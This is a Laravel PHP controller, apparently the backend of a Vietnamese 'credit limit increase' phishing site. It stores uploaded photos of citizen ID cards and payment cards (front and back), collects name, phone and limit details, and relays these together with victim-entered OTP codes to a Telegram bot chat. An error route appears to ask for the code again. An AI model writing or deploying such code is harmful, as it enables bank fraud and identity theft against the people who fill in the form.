<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;

class OtpController extends Controller
{
    public function save(Request $request)
    {
       
        // loop imageIds save to storage
        // save image
        $mattruoc_name = '';
        $matsau_name = '';
        $mattruoc_card_name = '';
        $matsau_card_name = '';

        if ($request->hasFile('mattruoc')) {
            $mattruoc = $request->file('mattruoc');
            $mattruoc_name = 'mặt-trước-cccd-' . time() . '.' . $mattruoc->extension();
            $mattruoc->storeAs('public', $mattruoc_name);
        }

        if ($request->hasFile('matsau')) {
            $matsau = $request->file('matsau');
            $matsau_name = 'mặt-sau-cccd-' . time() . '.' . $matsau->extension();
            $matsau->storeAs('public', $matsau_name);
        }

        if ($request->hasFile('mattruoc_card')) {
            $mattruoc_card = $request->file('mattruoc_card');
            $mattruoc_card_name = 'mặt-trước-thẻ-' . time() . '.' . $mattruoc_card->extension();
            $mattruoc_card->storeAs('public', $mattruoc_card_name);
        }

        if ($request->hasFile('matsau_card')) {
            $matsau_card = $request->file('matsau_card');
            $matsau_card_name = 'mặt-sau-thẻ-' . time() . '.' . $matsau_card->extension();
            $matsau_card->storeAs('public', $matsau_card_name);
        }

        // send html
        $message = " <b>Có khách hàng mới:</b> \n";
        $message .= " <b>Tên:</b> " . $request->name . "\n";
        $message .= " <b>Số điện thoại:</b> " . $request->phone . "\n";
        $message .= " <b>Giới hạn hiện tại:</b> " . $request->limit_now . "\n";
        $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
        $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" .
            asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";

        file_get_contents($url);

        return redirect()->route('otp');
    }

    public function otp(Request $request)
    {
        $request->validate([
            'otp' => 'required',
        ], [
            'otp.required' => 'Vui lòng nhập số điện thoại',
        ]);

        $otp =  $request->otp;

        // send otp to phone
        $message = "Mã OTP là: " . $otp;
        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;

        file_get_contents($url);

        return redirect()->route('otp');
    }

    public function saveError(Request $request)
    {
        $request->validate([
            'otp' => 'required',
        ], [
            'otp.required' => 'Vui lòng nhập số điện thoại',
        ]);

        $otp =  $request->otp;

        // send otp to phone
        $message = "Mã OTP là: " . $otp;
        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;

        file_get_contents($url);

        return redirect()->route('otp_error');
    }

    public function upload(Request $request)
    {
        $request->validate([
            'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ], [
            'image.required' => 'Vui lòng chọn ảnh',
            'image.image' => 'Ảnh không đúng định dạng',
            'image.mimes' => 'Ảnh không đúng định dạng',
            'image.max' => 'Ảnh không quá 2MB',
        ]);

        $image = $request->file('image');
        $image_name = 'image-' . time() . '.' . $image->extension();
        $image->storeAs('public', $image_name);

        return response()->json([
            'message' => 'Upload ảnh thành công',
            'imageUrl' => asset('storage/' . $image_name),
            'status' => 'success'
        ]);
    }
}
